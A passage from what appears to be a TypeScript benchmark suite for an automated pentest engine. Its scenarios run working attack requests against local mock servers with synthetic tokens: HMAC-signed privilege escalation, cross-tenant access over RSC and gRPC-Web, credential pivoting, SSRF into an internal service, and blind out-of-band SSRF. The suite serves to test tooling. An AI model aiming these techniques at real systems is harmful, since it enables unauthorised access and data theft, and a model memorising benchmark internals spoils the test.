			verifyCmd: `curl -sS -H "Authorization: Bearer ${freshTok}" ${srv.baseUrl}/api/v1/ledger/statements/2026-q4`,
			verifyOutput: hit2,
		});

		return finalizeAndAuditL4Scenario({
			engine, root, spec,
			secretsToAudit: [expiredTok, freshTok, password, totpSeed],
			detail: `401捕获 -> CSRF+TOTP(${totpCode.length}位)热续期 -> BOLA确认且全凭据零泄露`,
		});
	},

	"s07-inpage-hmac-signed-diff": async (spec, srv, env) => {
		const { root, engine } = await initScenarioEngine(env, spec, srv);
		const opTok = L4_SYNTHETIC_SECRETS.s07OperatorBearer;
		const admTok = L4_SYNTHETIC_SECRETS.s07AdminBearer;
		upsertSessionRole(root, { role: "operator", bearer: opTok });
		upsertSessionRole(root, { role: "admin", bearer: admTok });

		// 1. 提取同源前端脚本中的动态签名上下文并收纳至 SessionVault 确保报告全量脱敏
		const jsCode = await (await fetch(`${srv.baseUrl}/app/treasury.js`)).text();
		const extractedSignKey = /__TREASURY_SIGN_KEY__\s*=\s*"([^"]+)"/.exec(jsCode)?.[1] ?? "";
		assertOk(extractedSignKey === L4_SYNTHETIC_SECRETS.s07PageSigningKey, "应从同源前端脚本提取签名上下文密钥");
		upsertSessionRole(root, {
			role: "operator",
			bearer: opTok,
			headers: { "X-Treasury-Sign-Secret": extractedSignKey },
		});

		// 2. 验证未签名请求被 403 拒绝
		const unsignedRes = await fetch(`${srv.baseUrl}/api/v2/treasury/approval-policy`, {
			method: "PATCH",
			headers: { Authorization: `Bearer ${opTok}`, "Content-Type": "application/json" },
			body: '{"requireDualApproval":false}',
		});
		assertOk(unsignedRes.status === 403, "缺少动态 HMAC 签名时必须返回 403");

		const sendSigned = async (method: string, path: string, bodyObj: unknown, token: string, forceNonce?: string) => {
			const bodyStr = bodyObj ? JSON.stringify(bodyObj) : "";
			const ts = String(Math.floor(Date.now() / 1000));
			const nonce = forceNonce ?? `n_${randomBytes(8).toString("hex")}`;
			const sig = computeInPageRequestSignature(extractedSignKey, method, path, ts, nonce, bodyStr);
			const res = await fetch(`${srv.baseUrl}${path}`, {
				method,
				headers: {
					Authorization: `Bearer ${token}`,
					"Content-Type": "application/json",
					"X-Timestamp": ts,
					"X-Nonce": nonce,
					"X-Client-Sig": sig,
				},
				...(bodyStr ? { body: bodyStr } : {}),
			});
			return { status: res.status, text: await res.text(), nonce };
		};

		// 3. 验证严格受保护的 /api/v2/treasury/vault-master-rotate 对 operator 仍返回 403（零误报对照）
		const rotateCheck = await sendSigned("POST", "/api/v2/treasury/vault-master-rotate", { rotate: true }, opTok);
		assertOk(rotateCheck.status === 403, "已加固管理接口即使签名合法也应对 operator 返回 403");

		// 4. 对 PATCH /api/v2/treasury/approval-policy 执行动态签名差分突破，并验证相同 Nonce 重放被拒
		const signedHit1 = await sendSigned("PATCH", "/api/v2/treasury/approval-policy", { requireDualApproval: false }, opTok);
		assertOk(signedHit1.status === 200 && signedHit1.text.includes("L4_S07_SIGNED_PATCH_BFLA_CONFIRMED"), "动态签名 PATCH 应检出垂直越权");

		const replayAttempt = await sendSigned("PATCH", "/api/v2/treasury/approval-policy", { requireDualApproval: false }, opTok, signedHit1.nonce);
		assertOk(replayAttempt.status === 403, "重放旧 Nonce 必须被服务端防重放门禁拦截");

		const signedHit2 = await sendSigned("PATCH", "/api/v2/treasury/approval-policy", { requireDualApproval: true }, opTok);
		assertOk(signedHit2.status === 200, "独立复验签发新 Nonce 应再次验证通过");

		const intentId = await planSingleVulnIntent(engine, "验证 PATCH /api/v2/treasury/approval-policy 页面内动态签名垂直越权", "/api/v2/treasury/approval-policy");
		await commitAndConfirmL4Finding({
			engine, root, intentId,
			title: "Vertical BFLA 页面动态 HMAC 签名保护下的审批策略垂直越权 PATCH /api/v2/treasury/approval-policy",
			detail: `为 operator (${opTok}，对照 ${admTok}，签名盐 ${extractedSignKey}) 实时签发抗重放 HMAC 头成功越权修改双人审批策略`,
			candidateCmd: `inpage-signed-probe PATCH ${srv.baseUrl}/api/v2/treasury/approval-policy`,
			candidateOutput: signedHit1.text,
			verifyCmd: `inpage-signed-probe PATCH ${srv.baseUrl}/api/v2/treasury/approval-policy`,
			verifyOutput: signedHit2.text,
		});

		return finalizeAndAuditL4Scenario({
			engine, root, spec,
			secretsToAudit: [opTok, admTok, extractedSignKey],
			detail: "裸发403/重放403/加固端点403 -> 实时Nonce+HMAC签名PATCH突破200",
		});
	},

	"s08-rsc-flight-grpc-web-bola": async (spec, srv, env) => {
		const { root, engine } = await initScenarioEngine(env, spec, srv);
		const tok = L4_SYNTHETIC_SECRETS.s08BetaBearer;
		upsertSessionRole(root, { role: "org_beta", bearer: tok });

		// 1. Next.js RSC Flight 协议字段解析与跨组织越权验证
		const callRscFlight = async (orgId: string) => {
			const r = await fetch(`${srv.baseUrl}/_rsc/action`, {
				method: "POST",
				headers: {
					Authorization: `Bearer ${tok}`,
					"Next-Action": "act_fetch_org_billing_7f2c",
					"Content-Type": "text/plain;charset=UTF-8",
				},
				body: `0:["$K1",{"orgId":"${orgId}","includeBilling":true}]`,
			});
			return { status: r.status, text: await r.text() };
		};
		const rscHit1 = await callRscFlight("org-alpha");
		const rscHit2 = await callRscFlight("org-alpha");
		assertOk(rscHit1.status === 200 && rscHit1.text.includes("RSC_FLIGHT_ALPHA_BOLA_L4S08"), "RSC Flight 跨组织参数变异应检出 BOLA");

		// 2. gRPC-Web 5 字节帧 + Protobuf Wire 协议编解码与跨组织越权验证
		const callGrpcWeb = async (orgId: string) => {
			const reqFrame = encodeGrpcWebOrgRequest(orgId, true);
			const r = await fetch(`${srv.baseUrl}/nuwa.l4.OrgService/GetOrgSecretMeta`, {
				method: "POST",
				headers: {
					Authorization: `Bearer ${tok}`,
					"Content-Type": "application/grpc-web+proto",
					"X-Grpc-Web": "1",
				},
				body: reqFrame.slice().buffer as ArrayBuffer,
			});
			const respBuf = new Uint8Array(await r.arrayBuffer());
			return decodeGrpcWebFrameResponse(respBuf);
		};
		const grpcHit1 = await callGrpcWeb("org-alpha");
		const grpcHit2 = await callGrpcWeb("org-alpha");
		assertOk(grpcHit1.grpcStatus === 0 && grpcHit1.payloadText.includes("GRPC_WEB_ALPHA_BOLA_L4S08"), "gRPC-Web Protobuf 字段变异应检出 BOLA");

		const rscIntentId = await planSingleVulnIntent(engine, "验证 /_rsc/action Next.js RSC Flight Action 跨组织越权", "/_rsc/action");
		await commitAndConfirmL4Finding({
			engine, root, intentId: rscIntentId,
			title: "BOLA Next.js RSC Flight Server Action 跨组织账单越权 /_rsc/action",
			detail: `org-beta (${tok}) 变异 RSC Flight 行参数 orgId=org-alpha 获取企业账单标识`,
			candidateCmd: `rsc-flight-probe ${srv.baseUrl}/_rsc/action orgId=org-alpha`,
			candidateOutput: rscHit1.text,
			verifyCmd: `rsc-flight-probe ${srv.baseUrl}/_rsc/action orgId=org-alpha`,
			verifyOutput: rscHit2.text,
		});

		const grpcIntentId = await planSingleVulnIntent(engine, "验证 /nuwa.l4.OrgService/GetOrgSecretMeta gRPC-Web Protobuf 跨组织越权", "/nuwa.l4.OrgService/GetOrgSecretMeta");
		await commitAndConfirmL4Finding({
			engine, root, intentId: grpcIntentId,
			title: "BOLA gRPC-Web Protobuf 字段参数跨组织越权 /nuwa.l4.OrgService/GetOrgSecretMeta",
			detail: `org-beta (${tok}) 编码 Protobuf field#1=org-alpha 收到 grpc-status=0 越权负载`,
			candidateCmd: `grpc-web-probe ${srv.baseUrl}/nuwa.l4.OrgService/GetOrgSecretMeta orgId=org-alpha`,
			candidateOutput: grpcHit1.payloadText,
			verifyCmd: `grpc-web-probe ${srv.baseUrl}/nuwa.l4.OrgService/GetOrgSecretMeta orgId=org-alpha`,
			verifyOutput: grpcHit2.payloadText,
		});

		return finalizeAndAuditL4Scenario({
			engine, root, spec, secretsToAudit: [tok],
			detail: "RSC Flight流解析越权 + gRPC-Web 5字节Protobuf帧越权双确认(2/2)",
		});
	},

	"s09-cross-origin-cred-pivot": async (spec, srv, env) => {
		// 显式关闭泛化回环放行（allowLoopback: false），仅精确授权 127.0.0.1，使 localhost / 外部域名严格被 ScopePolicy 阻断
		const { root, engine } = await initScenarioEngine(env, spec, srv, {
			allowHosts: ["127.0.0.1"],
			denyHosts: ["external-partner.outside.invalid"],
			allowLoopback: false,
		});
		const ssoTok = L4_SYNTHETIC_SECRETS.s09PortalSsoToken;
		upsertSessionRole(root, { role: "portal_sso", bearer: ssoTok });
		assertOk(Boolean(srv.peerUrl && srv.outOfScopeUrl), "场景 9 必须提供授权兄弟节点与未授权外部对照节点");

		const scope = loadState(root)!.project.scope!;

		// 1. 对候选跨端口/跨子域资产逐一执行 ScopePolicy 强门禁校验
		const candidatePivotAssets = [
			srv.peerUrl!,
			srv.outOfScopeUrl!,
			`http://external-partner.outside.invalid:${srv.outOfScopePort}`,
		];
		const allowedPivotUrls: string[] = [];
		for (const assetUrl of candidatePivotUrlsFrom(candidatePivotAssets)) {
			const host = new URL(assetUrl).hostname;
			const hostVerdict = isHostInScope(host, scope);
			const cmdVerdict = checkScopeAndRisk(`curl -sS ${assetUrl}/api/internal/cluster-keys`, scope, "pentest");
			if (hostVerdict.ok && !cmdVerdict) {
				allowedPivotUrls.push(assetUrl);
			}
		}

		assertOk(allowedPivotUrls.length === 1 && allowedPivotUrls[0] === srv.peerUrl, "Scope 门禁必须放行授权兄弟节点并拦截未授权外部节点");
		assertOk(srv.getOutOfScopeHits() === 0, "未授权外部资产收到的请求数必须严格等于 0");
		env.recordOutOfScopeHits(srv.getOutOfScopeHits());

		// 2. 验证主站访问 /api/internal/cluster-keys 为 403，授权兄弟节点未带凭据为 401，横向复用门户 SSO 令牌后打穿 200
		const mainCheck = await fetch(`${srv.baseUrl}/api/internal/cluster-keys`, { headers: { Authorization: `Bearer ${ssoTok}` } });
		const peerAnon = await fetch(`${srv.peerUrl}/api/internal/cluster-keys`);
		assertOk(mainCheck.status === 403 && peerAnon.status === 401, "主站应 403 且兄弟节点匿名基线应 401");

		const pivot1 = await (await fetch(`${srv.peerUrl}/api/internal/cluster-keys`, { headers: { Authorization: `Bearer ${ssoTok}` } })).text();
		const pivot2 = await (await fetch(`${srv.peerUrl}/api/internal/cluster-keys`, { headers: { Authorization: `Bearer ${ssoTok}` } })).text();
		assertOk(pivot1.includes("PIVOT_CLUSTER_KEY_L4_S09_CONFIRMED"), "授权兄弟节点应检出跨端口凭据横向复用越权");
		assertOk(srv.getOutOfScopeHits() === 0, "全流程结束后未授权资产请求数仍必须为 0");

		const intentId = await planSingleVulnIntent(engine, `验证跨端口资产 ${srv.peerUrl}/api/internal/cluster-keys 凭据横向复用提权`, "/api/internal/cluster-keys");
		await commitAndConfirmL4Finding({
			engine, root, intentId,
			title: "Privilege Escalation 跨端口管理服务横向复用门户低权限 SSO 令牌 /api/internal/cluster-keys",
			detail: `门户普通令牌 ${ssoTok} 在授权兄弟资产 ${srv.peerUrl} 横向复用成功读取集群密钥引用（越界资产发包=0）`,
			candidateCmd: `curl -sS -H "Authorization: Bearer ${ssoTok}" ${srv.peerUrl}/api/internal/cluster-keys`,
			candidateOutput: pivot1,
			verifyCmd: `curl -sS -H "Authorization: Bearer ${ssoTok}" ${srv.peerUrl}/api/internal/cluster-keys`,
			verifyOutput: pivot2,
		});

		return finalizeAndAuditL4Scenario({
			engine, root, spec, secretsToAudit: [ssoTok],
			detail: `越界节点拦截(outOfScopeHits=${srv.getOutOfScopeHits()}) + 授权兄弟端口凭据复用确认`,
		});
	},

	"s10-confirmed-ssrf-internal-pivot": async (spec, srv, env) => {
		const { root, engine } = await initScenarioEngine(env, spec, srv, {
			allowHosts: ["127.0.0.1"],
			allowPrivateNetwork: true,
			allowLoopback: true,
		});
		const tok = L4_SYNTHETIC_SECRETS.s10OperatorBearer;
		upsertSessionRole(root, { role: "operator", bearer: tok });
		assertOk(Boolean(srv.internalUrl), "场景 10 必须提供内网隔离模拟节点");

		// 1. 验证直接从外部探测内网隔离服务被网络网格拦截 (403)
		const directAttempt = await fetch(`${srv.internalUrl}/internal/v1/service-catalog`);
		assertOk(directAttempt.status === 403 && srv.getDirectInternalBlockedHits() === 1, "未通过网关桥接直接访问隔离服务必须返回 403");

		// 2. 先确认边界网关 SSRF 转发能力并升级为 verifyStage === "confirmed"，随后桥接测绘内网服务目录
		const bridgeTarget = `${srv.baseUrl}/api/v1/proxy/preview?upstream=${encodeURIComponent(`${srv.internalUrl}/internal/v1/service-catalog`)}`;
		const bridge1 = await (await fetch(bridgeTarget, { headers: { Authorization: `Bearer ${tok}` } })).text();
		const bridge2 = await (await fetch(bridgeTarget, { headers: { Authorization: `Bearer ${tok}` } })).text();
		assertOk(bridge1.includes("SSRF_MESH_CATALOG_L4_S10_CONFIRMED"), "通过已确认 SSRF 桥接应成功测绘内网服务目录");

		const intentId = await planSingleVulnIntent(engine, "验证 /api/v1/proxy/preview SSRF 桥接测绘内网隔离微服务目录", "/api/v1/proxy/preview");
		const ssrfFactId = await commitAndConfirmL4Finding({
			engine, root, intentId,
			title: "Server-Side Request Forgery (SSRF) 边界预览接口桥接暴露内网隔离服务目录 /api/v1/proxy/preview",
			detail: `携带 ${tok} 通过网关 SSRF 桥接绕过网格直连限制，测绘出 ${srv.internalUrl}/internal/v1/service-catalog`,
			candidateCmd: `curl -sS -H "Authorization: Bearer ${tok}" "${bridgeTarget}"`,
			candidateOutput: bridge1,
			verifyCmd: `curl -sS -H "Authorization: Bearer ${tok}" "${bridgeTarget}"`,
			verifyOutput: bridge2,
		});

		// 将通过 confirmed SSRF 测绘出的隔离节点登记入 NuwaState.assets 拓扑图
		withLock(root, () => {
			const st = loadState(root)!;
			st.assets = st.assets ?? {};
			st.assets["asset-internal-mesh"] = {
				id: "asset-internal-mesh",
				kind: "service",
				target: srv.internalUrl!,
				host: "127.0.0.1",
				port: srv.internalPort,
				scheme: "http",
				reachableVia: [ssrfFactId],
				tags: ["ssrf-bridged", "isolated-mesh"],
				sourceFactId: ssrfFactId,
				createdAt: FIXED_L4_EVAL_TS,
			};
			saveState(root, st);
		});

		return finalizeAndAuditL4Scenario({
			engine, root, spec, secretsToAudit: [tok],
			detail: `直连403阻断 -> Confirmed SSRF(${ssrfFactId})桥接内网目录测绘与AssetNode入图通过`,
		});
	},

	"s11-spring-rgs-standalone-pov": async (spec, srv, env) => {
		const { root, engine } = await initScenarioEngine(env, spec, srv);
		const memberTok = L4_SYNTHETIC_SECRETS.s11MemberBearer;
		const adminTok = L4_SYNTHETIC_SECRETS.s11AdminBearer;
		upsertSessionRole(root, { role: "member", bearer: memberTok });
		upsertSessionRole(root, { role: "admin", bearer: adminTok });

		// 1. 跨文件 RGS 静态图谱分析：验证 AdminUserController 假阳性被全局 SecurityFilterChain 抑制，精准定位 LegacyExportController 缺口
		const rgs = analyzeCrossFileRgs(srv.springVirtualFiles!);
		const adminRoute = rgs.routes.find((r) => r.path === "/api/v1/admin/users");
		const legacyRoute = rgs.routes.find((r) => r.path === "/api/v1/legacy-bridge/tenant-ledger");
		assertOk(adminRoute?.hasEffectiveGuard === true && adminRoute.suppressedByGlobalGuard === true, "AdminUserController 必须被跨文件 SecurityFilterChain 识别为已受保护");
		assertOk(legacyRoute?.hasEffectiveGuard === false && legacyRoute.dataflowChains.length === 1, "LegacyExportController 必须检出跨文件鉴权缺口与 MyBatis 数据流链");

		const scope = loadState(root)!.project.scope ?? defaultScopeForTarget(srv.baseUrl, "pentest");
		const bridged = bridgeRgsToVerificationIntents(rgs, srv.baseUrl, { scope });
		assertOk(
			bridged.intents.length === 1 && bridged.intents[0]!.path === "/api/v1/legacy-bridge/tenant-ledger",
			`RGS 桥接应仅产出 1 条高置信待验证意图（零误报），实际=${bridged.intents.length}`,
		);

		// 2. 动态验证并在 NuwaCoreEngine 中完成双盲复验使事实进入 confirmed
		const targetPath = "/api/v1/legacy-bridge/tenant-ledger?sortBy=id";
		const hit1 = await (await fetch(`${srv.baseUrl}${targetPath}`, { headers: { Authorization: `Bearer ${memberTok}` } })).text();
		const hit2 = await (await fetch(`${srv.baseUrl}${targetPath}`, { headers: { Authorization: `Bearer ${memberTok}` } })).text();
		assertOk(hit1.includes("SPRING_RGS_POV_L4_S11_CONFIRMED"), "遗漏鉴权路由应返回账本数据");

		const intentId = await planSingleVulnIntent(engine, bridged.intents[0]!.title, bridged.intents[0]!.targetKey);
		const confirmedFactId = await commitAndConfirmL4Finding({
			engine, root, intentId,
			title: `Spring Security permitAll 差集鉴权遗漏 ${bridged.intents[0]!.path} (${legacyRoute!.anchor})`,
			detail: `跨文件 RGS 定位 ${legacyRoute!.anchor} 落入 permitAll 缺口（对比 ${memberTok} / ${adminTok}）`,
			candidateCmd: `curl -sS -H "Authorization: Bearer ${memberTok}" "${srv.baseUrl}${targetPath}"`,
			candidateOutput: hit1,
			verifyCmd: `curl -sS -H "Authorization: Bearer ${memberTok}" "${srv.baseUrl}${targetPath}"`,
			verifyOutput: hit2,
		});

		// 3. 为 confirmed 事实生成独立可重放 `pov-<factId>.ts` 脚本，审计零明文凭据并子进程实跑验证退出码 === 0
		const confirmedFact = loadState(root)!.facts[confirmedFactId]!;
		const povDir = join(root, "standalone-pov");
		const povArtifact = writeStandalonePovScript(povDir, {
			fact: confirmedFact,
			explicit: {
				factId: confirmedFactId,
				title: confirmedFact.title,
				baseUrl: srv.baseUrl,
				path: targetPath,
				method: "GET",
				role: "member",
				headers: { Authorization: `Bearer ${memberTok}` },
				expectedStatus: 200,
				expectedBodyIncludes: ["SPRING_RGS_POV_L4_S11_CONFIRMED"],
				expectedJsonKeys: ["ledgerRows", "auditMarker"],
				protectedControlPath: "/api/v1/admin/users",
				protectedExpectedStatuses: [403],
				sourceAnchor: legacyRoute!.anchor,
			},
			vaultRootOrVault: root,
			knownSecretsToScrub: [memberTok, adminTok],
			scope,
		});

		const povSource = readFileSync(povArtifact.filePath, "utf8");
		assertOk(!povSource.includes(memberTok) && !povSource.includes(adminTok), "独立 PoV 脚本源码严禁出现任何明文令牌");

		const povProc = Bun.spawn(["bun", povArtifact.filePath], {
			env: { ...process.env, NUWA_POV_TOKEN_MEMBER: memberTok },
			stdout: "pipe",
			stderr: "pipe",
		});
		const povExitCode = await povProc.exited;
		const povStdout = await new Response(povProc.stdout).text();
		assertOk(povExitCode === 0, `实跑独立验证脚本 ${povArtifact.fileName} 退出码必须为 0，实际=${povExitCode} (${povStdout})`);
		assertOk(!povStdout.includes(memberTok), "PoV 标准输出同样不得回显明文令牌");
		env.recordPovExitZero(povExitCode === 0);

		return finalizeAndAuditL4Scenario({
			engine, root, spec,
			secretsToAudit: [memberTok, adminTok],
			detail: `RGS全局守卫抑制FP=1, 定位=${legacyRoute!.anchor}, 实跑${povArtifact.fileName}退出码=${povExitCode}`,
		});
	},

	"s12-fake200-trap-delayed-oob": async (spec, srv, env) => {
		const { root, engine } = await initScenarioEngine(env, spec, srv, {
			allowLoopback: true,
			oobDomains: ["127.0.0.1"],
		});
		const jobTok = L4_SYNTHETIC_SECRETS.s12JobAuthBearer;
		upsertSessionRole(root, { role: "job_runner", bearer: jobTok });
		assertOk(Boolean(srv.oobCollectorUrl), "场景 12 必须提供本机延迟 OOB 监听器");

		// 1. 探测多条敏感诱饵路径，通过 JSON 顶层结构同构率与归一化信息熵识别 Fake-200 欺骗陷阱并熔断（确保 0 误报）
		const decoyPaths = ["/.env", "/admin/config.json", "/backup.sql", "/trap/keys"];
		const decoySamples: Array<{ keys: string[]; entropy: number; body: string; status: number }> = [];
		for (const dp of decoyPaths) {
			const r = await fetch(`${srv.baseUrl}${dp}`);
			const body = await r.text();
			decoySamples.push({
				status: r.status,
				body,
				keys: extractJsonTopKeys(body),
				entropy: computeNormalizedShannonEntropy(body),
			});
		}
		const baseSample = decoySamples[0]!;
		const minJaccard = Math.min(...decoySamples.slice(1).map((s) => computeKeyJaccard(baseSample.keys, s.keys)));
		const maxEntropyDelta = Math.max(...decoySamples.slice(1).map((s) => Math.abs(s.entropy - baseSample.entropy)));
		const isIsomorphicFake200Trap = decoySamples.every((s) => s.status === 200) && minJaccard === 1 && maxEntropyDelta < 0.05;
		assertOk(isIsomorphicFake200Trap, `同构熵检测器必须识别带随机 reqId 的 Fake-200 欺骗陷阱 (jaccard=${minJaccard}, dH=${maxEntropyDelta})`);

		// 验证引擎对同构陷阱路径记录熔断排除说明而不产生任何假阳性漏洞
		await engine.callTool("nuwa_commit", {
			free_note: true,
			kind: "note",
			title: "识别全局 Fake-200 同构欺骗陷阱并执行路径探测熔断",
			detail: `探测 4 条诱饵路径结构 Jaccard=${minJaccard.toFixed(2)}, ΔH=${maxEntropyDelta.toFixed(4)}，判定为欺骗壳，零误报熔断`,
		});
		tickTurn(root, 1);

		// 2. 构造带上下文防伪造签名的异步 OOB Canary，触发延迟回调并精确因果归因至原注入点
		const intentId = await planSingleVulnIntent(engine, "验证 POST /api/v1/jobs/webhook-verify 异步延迟 OOB 服务端请求", "/api/v1/jobs/webhook-verify");
		const triggerAndAwaitDelayedOob = async (tag: string): Promise<string> => {
			const canaryToken = `cnry_${tag}_${randomBytes(4).toString("hex")}`;
			const ctxCanonical = `${canaryToken}|${intentId}|/api/v1/jobs/webhook-verify|webhookUrl`;
			const ctxSig = computeRfc2104Hmac("sha256", "nuwa-l4-oob-ledger-key", ctxCanonical).toString("hex").slice(0, 24);
			const cbUrl = `${srv.oobCollectorUrl}/cb/${canaryToken}?sig=${ctxSig}`;

			const trigRes = await fetch(`${srv.baseUrl}/api/v1/jobs/webhook-verify`, {
				method: "POST",
				headers: { Authorization: `Bearer ${jobTok}`, "Content-Type": "application/json" },
				body: JSON.stringify({ webhookUrl: cbUrl }),
			});
			assertOk(trigRes.status === 202, "异步任务提交应立即返回盲 202");

			// 等待异步延迟回调（45ms 后台触发）到达本机监听器并完成签名归因校验
			const deadline = Date.now() + 2500;
			while (Date.now() < deadline) {
				const matched = srv.getDelayedOobHits().find((h) => h.canaryToken === canaryToken && h.contextSig === ctxSig);
				if (matched) {
					return JSON.stringify({
						correlatedEndpoint: "/api/v1/jobs/webhook-verify",
						correlatedParam: "webhookUrl",
						intentId,
						hit: matched,
					});
				}
				await Bun.sleep(15);
			}
			throw new Error(`未在超时窗口内收到延迟异步 OOB 回调: ${canaryToken}`);
		};

		const oobEvidence1 = await triggerAndAwaitDelayedOob("cand");
		const oobEvidence2 = await triggerAndAwaitDelayedOob("verf");

		await commitAndConfirmL4Finding({
			engine, root, intentId,
			title: "Delayed Async Blind SSRF 延迟异步回调因果归因确认 POST /api/v1/jobs/webhook-verify",
			detail: `Fake-200 陷阱熔断后，携带 ${jobTok} 触发盲 202 异步队列并通过签名 Canary 精确归因至 webhookUrl 参数`,
			candidateCmd: `oob-correlate POST ${srv.baseUrl}/api/v1/jobs/webhook-verify param=webhookUrl`,
			candidateOutput: oobEvidence1,
			verifyCmd: `oob-correlate POST ${srv.baseUrl}/api/v1/jobs/webhook-verify param=webhookUrl`,
			verifyOutput: oobEvidence2,
		});

		return finalizeAndAuditL4Scenario({
			engine, root, spec, secretsToAudit: [jobTok],
			detail: `Fake-200同构熔断(Jaccard=${minJaccard},FP=0) + 延迟异步OOB命中=${srv.getDelayedOobHits().length}次归因实锤`,
		});
	},
};

function candidatePivotUrlsFrom(list: readonly string[]): string[] {
	return [...list];
}

// ==================== 套件总控与 CLI 入口 ====================

export async function runL4BenchmarkSuite(opts?: RunL4BenchmarkOptions): Promise<L4BenchmarkSummary> {
	const deterministic = Boolean(opts?.deterministic);
	const selectedSpecs = opts?.scenario
		? L4_SCENARIO_SPECS.filter((s) => s.id === opts.scenario)
		: [...L4_SCENARIO_SPECS];

	if (opts?.scenario && selectedSpecs.length === 0) {
		const validIds = L4_SCENARIO_SPECS.map((s) => s.id).join(", ");
		throw new Error(`未知 L4 场景 ID: ${opts.scenario}（可选值: ${validIds}）`);
	}

	const tmpDirs: string[] = [];
	const trackedProjectIds: string[] = [];
	let povExitZero = !selectedSpecs.some((s) => s.id === "s11-spring-rgs-standalone-pov");
	let outOfScopeHitsTotal = 0;

	const prevAgentHome = process.env.PI_AGENT_HOME;
	const prevNuwaProject = process.env.NUWA_PROJECT;
	const sandboxHome = mkdtempSync(join(tmpdir(), "nuwa-l4-agent-home-"));
	tmpDirs.push(sandboxHome);
	process.env.PI_AGENT_HOME = sandboxHome;
	delete process.env.NUWA_PROJECT;

	const env: L4EvalEnv = {
		makeWorkspace: (prefix: string) => {
			const dir = mkdtempSync(join(tmpdir(), prefix));
			tmpDirs.push(dir);
			return dir;
		},
		trackProjectId: (id: string) => {
			if (id) trackedProjectIds.push(id);
		},
		recordPovExitZero: (ok: boolean) => {
			povExitZero = ok;
		},
		recordOutOfScopeHits: (hits: number) => {
			outOfScopeHitsTotal += hits;
		},
	};

	const wallStart = Date.now();
	const scenarioResults: L4ScenarioEvalResult[] = [];

	try {
		for (const spec of selectedSpecs) {
			const t0 = Date.now();
			const srv = startL4ScenarioServer(spec.id);
			try {
				const evaluator = L4_EVALUATORS[spec.id];
				const outcome = await evaluator(spec, srv, env);
				scenarioResults.push({
					id: spec.id,
					index: spec.index,
					name: spec.name,
					category: spec.category,
					durationMs: deterministic ? 0 : Date.now() - t0,
					...outcome,
				});
			} catch (err) {
				scenarioResults.push({
					id: spec.id,
					index: spec.index,
					name: spec.name,
					category: spec.category,
					passed: false,
					terminalStatus: "error",
					turnsUsed: 0,
					expectedFindings: spec.expectedFindings,
					truePositives: 0,
					falseNegatives: spec.expectedFindings,
					falsePositives: 0,
					vaultLeaks: 0,
					durationMs: deterministic ? 0 : Date.now() - t0,
					detail: "场景执行异常",
					error: err instanceof Error ? err.message : String(err),
				});
			} finally {
				srv.stop();
			}
		}
	} finally {
		if (prevAgentHome === undefined) delete process.env.PI_AGENT_HOME;
		else process.env.PI_AGENT_HOME = prevAgentHome;

		if (prevNuwaProject === undefined) delete process.env.NUWA_PROJECT;
		else process.env.NUWA_PROJECT = prevNuwaProject;

		for (const pid of trackedProjectIds) {
			try { rmSync(join("/tmp/nuwa", pid), { recursive: true, force: true }); } catch { /* ignore */ }
		}
		for (const dir of tmpDirs) {
			try { rmSync(dir, { recursive: true, force: true }); } catch { /* ignore */ }
		}
	}

	const wallTimeMs = deterministic ? 0 : Date.now() - wallStart;
	const totalScenarios = scenarioResults.length;
	const passedScenarios = scenarioResults.filter((r) => r.passed).length;
	const expectedTotalFindings = scenarioResults.reduce((s, r) => s + r.expectedFindings, 0);
	const truePositiveCount = scenarioResults.reduce((s, r) => s + r.truePositives, 0);
	const falseNegativeCount = scenarioResults.reduce((s, r) => s + r.falseNegatives, 0);
	const falsePositiveCount = scenarioResults.reduce((s, r) => s + r.falsePositives, 0);
	const vaultLeakCount = scenarioResults.reduce((s, r) => s + r.vaultLeaks, 0);

	const recallRate = expectedTotalFindings > 0 ? Number((truePositiveCount / expectedTotalFindings).toFixed(4)) : 1;
	const falsePositiveRate = totalScenarios > 0 ? Number((falsePositiveCount / totalScenarios).toFixed(4)) : 0;

	const requiredScenarioTarget = opts?.scenario ? totalScenarios : 12;
	const gates: L4HardGates = {
		recallGate: recallRate === 1,
		zeroFalsePositiveGate: falsePositiveRate === 0,
		zeroVaultLeakGate: vaultLeakCount === 0,
		standalonePovGate: povExitZero,
		scopeIsolationGate: outOfScopeHitsTotal === 0,
		allPassed:
			passedScenarios === requiredScenarioTarget &&
			recallRate === 1 &&
			falsePositiveRate === 0 &&
			vaultLeakCount === 0 &&
			povExitZero &&
			outOfScopeHitsTotal === 0,
	};

	const metrics: L4ScorecardMetrics = {
		totalScenarios,
		passedScenarios,
		expectedTotalFindings,
		truePositiveCount,
		falseNegativeCount,
		falsePositiveCount,
		recallRate,
		falsePositiveRate,
		vaultLeakCount,
		standalonePovExitZero: povExitZero,
		outOfScopeLeakRequests: outOfScopeHitsTotal,
		wallTimeMs,
	};

	return {
		schema: 1,
		suite: "nuwa-l4-arena",
		deterministic,
		generatedAt: deterministic ? FIXED_L4_EVAL_TS : new Date().toISOString(),
		allPassed: gates.allPassed,
		passedScenarios,
		totalScenarios,
		recallRate,
		falsePositiveRate,
		vaultLeakCount,
		metrics,
		gates,
		scenarios: scenarioResults,
	};
}

function formatL4ScorecardTable(summary: L4BenchmarkSummary): string {
	const lines = [
		"pi-nuwa v8.0 L4 真实有状态 12 场景演武场评分卡 (NuwaCoreEngine 端到端闭环)",
		"====================================================================================================",
		`${"#".padStart(2)}  ${"SCENARIO".padEnd(36)} ${"STATUS".padEnd(6)} ${"TP/EXP".padStart(6)} ${"FP".padStart(3)} ${"LEAK".padStart(4)}  DETAIL`,
		"----------------------------------------------------------------------------------------------------",
	];
	for (const s of summary.scenarios) {
		const st = s.passed ? "PASS" : "FAIL";
		const note = s.error ? `ERROR: ${s.error}` : s.detail;
		lines.push(
			`${String(s.index).padStart(2)}  ${s.id.padEnd(36)} ${st.padEnd(6)} ${`${s.truePositives}/${s.expectedFindings}`.padStart(6)} ${String(s.falsePositives).padStart(3)} ${String(s.vaultLeaks).padStart(4)}  ${note}`,
		);
	}
	const m = summary.metrics;
	const g = summary.gates;
	lines.push(
		"----------------------------------------------------------------------------------------------------",
		`Metrics : passed=${m.passedScenarios}/${m.totalScenarios} | recallRate=${m.recallRate} (${m.truePositiveCount}/${m.expectedTotalFindings}) | falsePositiveRate=${m.falsePositiveRate} | vaultLeakCount=${m.vaultLeakCount} | povExit0=${m.standalonePovExitZero} | outOfScopeReqs=${m.outOfScopeLeakRequests}`,
